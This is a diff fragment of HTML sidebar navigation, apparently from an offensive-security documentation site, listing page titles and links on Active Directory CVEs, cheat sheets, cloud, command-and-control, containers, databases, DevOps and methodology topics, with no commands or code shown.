+      <a href="../../../active-directory/trust-relationship/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Trust - Relationship
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/trust-sid-hijacking/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Child Domain to Forest Compromise - SID Hijacking
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/trust-ticket/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Forest to Forest Compromise - Trust Ticket
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_45" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_45" id="__nav_3_45_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    CVE
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_45_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_45">
+            <span class="md-nav__icon md-icon"></span>
+            CVE
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/CVE/MS14-068/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    MS14-068 Checksum Validation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/CVE/NoPAC/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    NoPAC / samAccountName Spoofing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/CVE/PrintNightmare/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    PrintNightmare
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/CVE/PrivExchange/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    PrivExchange
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../active-directory/CVE/ZeroLogon/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    ZeroLogon
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Cheatsheets
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            Cheatsheets
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/as-400/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    AS400
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/escape-breakout/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Kiosk Escape and Jail Breakout
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/hash-cracking/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Hash Cracking
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/liferay/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Liferay
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/mimikatz-cheatsheet/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Mimikatz
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/miscellaneous-tricks/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Miscellaneous &amp; Tricks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/network-discovery/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Network Discovery
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/powershell-cheatsheet/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Powershell
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/shell-bind-cheatsheet/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Bind Shell
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/shell-reverse-cheatsheet/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Reverse Shell Cheat Sheet
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cheatsheets/source-code-management-ci/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Source Code Management &amp; CI/CD Compromise
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Cloud
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            Cloud
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_1" id="__nav_5_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Aws
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_1">
+            <span class="md-nav__icon md-icon"></span>
+            Aws
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/aws/aws-access-token/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    AWS - Access Token &amp; Secrets
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/aws/aws-cli/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    AWS - CLI
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/aws/aws-cognito/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    AWS - Service - Cognito
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/aws/aws-dynamodb/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    AWS - Service - DynamoDB
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/aws/aws-ec2/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    AWS - Service - EC2
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/aws/aws-enumeration/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    AWS - Enumerate
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/aws/aws-iam/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    AWS - Identity &amp; Access Management
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/aws/aws-ioc-detection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    AWS - IOC &amp; Detections
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/aws/aws-lambda/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    AWS - Service - Lambda &amp; API Gateway
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/aws/aws-metadata/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    AWS - Metadata SSRF
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/aws/aws-s3-bucket/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    AWS - Service - S3 Buckets
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/aws/aws-ssm/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    AWS - Service - SSM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/aws/aws-training/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    AWS - Training
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_2" id="__nav_5_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Azure
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_2">
+            <span class="md-nav__icon md-icon"></span>
+            Azure
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/aka-ms/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    aka.ms Shortcuts
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-access-and-token/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Azure AD - Access and Tokens
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-ad-conditional-access-policy/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Azure AD - Conditional Access Policy
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-ad-connect/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Azure AD - AD Connect and Cloud Sync
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-devices-users-sp/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Azure AD - IAM
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-enumeration/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Azure AD - Enumerate
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-persistence/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Azure AD - Persistence
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-phishing/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Azure AD - Phishing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-requirements/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Azure - Requirements
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-services-application-endpoint/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Azure Services - Application Endpoint
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-services-application-proxy/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Azure Services - Application Proxy
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-services-container-registry/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Azure Services - Container Registry
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-services-deployment-template/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Azure Services - Deployment Template
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-services-devops/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Azure Services - Azure DevOps
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-services-keyvault/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Azure Services - KeyVault
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-services-microsoft-intune/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Azure Services - Microsoft Intune
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-services-office-365/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Azure Services - Office 365
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-services-runbook/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Azure Services - Runbook and Automation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-services-storage-blob/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Azure Services - Storage Blob
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-services-virtual-machine/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Azure Services - Virtual Machine
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-services-web-apps/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Azure Services - Web Apps
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/azure/azure-services-web-domains/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Azure Services - DNS Suffix
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_3" id="__nav_5_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Ibm
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_3">
+            <span class="md-nav__icon md-icon"></span>
+            Ibm
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/ibm/ibm-cloud-databases/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    IBM Cloud Managed Database Services
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../cloud/ibm/ibm-cloud-object-storage/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    IBM Cloud Object Storage
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Command control
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            Command control
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../command-control/cobalt-strike-beacons/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cobalt Strike - Beacons
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../command-control/cobalt-strike-kits/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cobalt Strike - Kits
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../command-control/cobalt-strike/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cobalt Strike
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../command-control/metasploit/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Metasploit
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../command-control/mythic/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Mythic C2
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Containers
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            Containers
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../containers/docker/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Docker
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../containers/kubernetes/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Kubernetes
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Databases
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            Databases
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../databases/mssql-audit-checks/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    MSSQL - Audit Checks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../databases/mssql-command-execution/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    MSSQL - Command Execution
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../databases/mssql-credentials/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    MSSQL - Credentials
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../databases/mssql-enumeration/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    MSSQL - Database Enumeration
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../databases/mssql-linked-database/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    MSSQL - Linked Database
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Devops
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            Devops
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../devops/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CI/CD attacks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../devops/azure-devops/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Azure DevOps
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../devops/buildkite/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    BuildKite
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../devops/circle-ci/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CircleCI
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../devops/drone-ci/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Drone CI
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../devops/github-actions/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    GitHub Actions
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
+        
+          
+          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Methodology
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_10">
+            <span class="md-nav__icon md-icon"></span>
+            Methodology
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../methodology/android-applications/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Android Application
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../methodology/bug-hunting-methodology/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Bug Hunting Methodology
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../methodology/source-code-analysis/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Source Code Analysis
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../methodology/vulnerability-reports/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Vulnerability Reports
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
